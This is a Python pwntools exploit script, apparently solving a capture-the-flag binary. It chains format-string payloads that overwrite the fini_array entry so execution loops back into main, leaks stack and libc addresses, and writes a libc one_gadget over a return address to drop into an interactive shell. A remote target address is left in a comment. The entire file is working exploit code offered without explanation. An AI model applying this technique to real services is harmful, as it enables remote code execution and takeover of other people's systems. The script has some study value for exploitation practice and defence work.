from concurrent.futures import process
import sys
from pwn import *

elf = ELF("chall")
libc = ELF("libc.so.6")

io = process(elf.path)
# io = remote("54.152.139.83", 9005)

gdb.attach(io,'''
    b *0x0000000000401226
''')

one_gadget1 = 0xe3afe
one_gadget2 = 0xe3b01
one_gadget3 = 0xe3b04

bss_addr = 0x404090
offset = bss_addr - elf.sym["__do_global_dtors_aux_fini_array_entry"]
payload = b"%%%dc%%34$n" % offset
offset = elf.sym["main"] - offset
payload += b"%%%dc%%10$n" % offset
payload += b"%12$p"
payload += b"A" * (0x20 - len(payload))
payload += p64(bss_addr)
io.sendline(payload)

ret = io.recvuntil(b"AAA\x90@@")
stack_arena_addr = int(ret[-18:-6].decode(), 16)

ret_addr = stack_arena_addr - 456

payload = b"%9$n"
payload += b"%*37$c%10$n"
payload += b"%24$p"
payload += b"A" * (0x18 - len(payload))
payload += p64(ret_addr + 4)
payload += p64(ret_addr)
io.sendline(payload)

ret = io.recvuntil(b"AAAA")
libc.address = int(ret[-16:-4].decode(), 16) - libc.sym["_IO_2_1_stderr_"]

print("libc addr: " + str(hex(libc.address)))
ret_addr -= 0xe0
payload = b"%25$n"
b = ((libc.address + one_gadget2) >> 16)  & 0xff
payload += b"%%%dc%%10$hhn" % b
b = (((libc.address + one_gadget2) & 0xffff) - b)
payload += b"%%%dc%%11$hn" % b
payload += b"A" * (0x20 - len(payload))
payload += p64(ret_addr + 2)
payload += p64(ret_addr)

io.sendline(payload)


io.interactive()